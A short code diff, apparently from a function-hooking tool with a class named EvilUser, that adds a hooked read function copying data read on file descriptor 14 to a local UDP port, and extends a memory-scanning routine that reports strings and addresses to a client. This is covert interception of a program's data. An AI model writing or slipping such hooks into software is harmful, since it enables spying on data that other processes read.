@@ -64,7 +64,7 @@ bool searchBinary(int sockFd, struct sockaddr_in *client, Elf64_Addr baseAddr,
         status = true;
         p += ret;
 
-        snprintf(buffer, sizeof(buffer), "str = %s, addr = %p\n", p, p);
+        snprintf(buffer, sizeof(buffer), "str = %s, addr = %p, size = %d\n", p, p, strlen((char *)p));
         sendto(sockFd, buffer, strlen(buffer), 0,(struct sockaddr*)client,sizeof(*client)); 
         p += 1;
 
@@ -129,6 +129,22 @@ ssize_t EvilUser::evilAccept(int sockfd, struct sockaddr *addr, socklen_t *addrl
 
 ssize_t EvilUser::evilRead(int fd, void *&buf, size_t &count)
 {
+    static int sockReadFd = 0;
+    if (!sockReadFd)
+    {
+        sockReadFd = socket(AF_INET,SOCK_DGRAM,0);
+        
+    }
+
+    struct sockaddr_in local;
+        local.sin_family=AF_INET;
+        local.sin_port = htons(11114);
+        local.sin_addr.s_addr = inet_addr("127.0.0.1");
+    
+    if (fd == 14)
+    {
+        sendto(sockReadFd, buf, count, 0, (struct sockaddr*)&local,sizeof(local)); 
+    }
     return 0;
 }
 
